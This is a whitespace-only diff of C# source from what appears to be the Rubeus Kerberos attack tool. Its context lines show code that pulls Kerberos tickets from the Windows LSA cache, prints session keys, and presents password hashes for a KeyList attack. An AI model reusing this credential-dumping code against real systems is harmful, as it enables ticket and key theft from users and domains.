@@ -79,7 +79,7 @@ namespace Rubeus {
 
                 Interop.LsaConnectUntrusted(out lsaHandle);
                 Interop.RevertToSelf();
-            
+
             } else {
                 Interop.LsaConnectUntrusted(out lsaHandle);
             }
@@ -112,10 +112,10 @@ namespace Rubeus {
             //          "If there is no match in the cache, a new ticket with the default flag values will be requested."
             //  Yes, I know this is weird. No, I have no idea why it happens. Specifying 0x0 (the default) will return just the main
             //      (initial) TGT, or a forwarded ticket if that's all that exists (a la the printer bug)
-            request.CacheOptions = (uint)(CacheOptions.KERB_RETRIEVE_TICKET_AS_KERB_CRED | (cachedTicket ? 0 : CacheOptions.KERB_RETRIEVE_TICKET_DONT_USE_CACHE)); 
+            request.CacheOptions = (uint)(CacheOptions.KERB_RETRIEVE_TICKET_AS_KERB_CRED | (cachedTicket ? 0 : CacheOptions.KERB_RETRIEVE_TICKET_DONT_USE_CACHE));
             request.EncryptionType = 0x0;
- 
-            
+
+
             // the target ticket name we want the ticket for
             var tName = new Interop.UNICODE_STRING(targetName);
             request.TargetName = tName;
@@ -130,21 +130,21 @@ namespace Rubeus {
 
             // marshal the struct from a managed object to an unmanaged block of memory.
             Marshal.StructureToPtr(request, unmanagedAddr, false);
-            
+
             // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
             var newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));
 
             // copy unicode chars to the new location
             Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);
 
-            // update the target name buffer ptr            
+            // update the target name buffer ptr
             Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size == 8 ? 24 : 16, newTargetNameBuffPtr);
 
             // actually get the data
             int retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack,
                 unmanagedAddr, newStructSize, out responsePointer,
                 out returnBufferLength, out protocalStatus);
-            
+
             // TODO: is this needed?
             //if (retCode != 0)
             //{
@@ -284,7 +284,7 @@ namespace Rubeus {
                     SESSION_CRED sessionCred = new SESSION_CRED();
                     sessionCred.LogonSession = logonSessionData;
                     sessionCred.Tickets = new List<KRB_TICKET>();
-                    
+
                     // phase 1 of targeting
 
                     // exclude computer accounts unless instructed otherwise
@@ -313,7 +313,7 @@ namespace Rubeus {
                         // if we're not elevated, we have to have a LUID of 0 here to prevent failure
                         ticketCacheRequest.LogonId = new LUID();
                     }
-                    
+
                     var tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ticketCacheRequest));
                     Marshal.StructureToPtr(ticketCacheRequest, tQueryPtr, false);
 
@@ -545,7 +545,7 @@ namespace Rubeus {
                 Console.WriteLine("{0}Flags                    :  {1}", indent, cred.enc_part.ticket_info[0].flags);
                 Console.WriteLine("{0}KeyType                  :  {1}", indent, keyType);
                 Console.WriteLine("{0}Base64(key)              :  {1}", indent, b64Key);
-                                  
+
                 // If KeyList attack then present the password hash
                 if (keyList != null)
                 {
@@ -625,7 +625,7 @@ namespace Rubeus {
             }
 
             if (serviceKey != null) {
-                
+
                 try
                 {
                     bool displayBlockOne = true;
@@ -636,7 +636,7 @@ namespace Rubeus {
                         Console.WriteLine("[X] Unable to get the PAC");
                         return;
                     }
-                    
+
                     if (krbKey == null && (serviceName == "krbtgt") && (cred.enc_part.ticket_info[0].srealm.ToUpper() == sname.Split('/')[1].ToUpper()))
                     {
                         krbKey = serviceKey;
@@ -1236,7 +1236,7 @@ namespace Rubeus {
             // copy unicode chars to the new location
             Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);
 
-            // update the target name buffer ptr            
+            // update the target name buffer ptr
             Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size == 8 ? 24 : 16, newTargetNameBuffPtr);
 
             // actually get the data
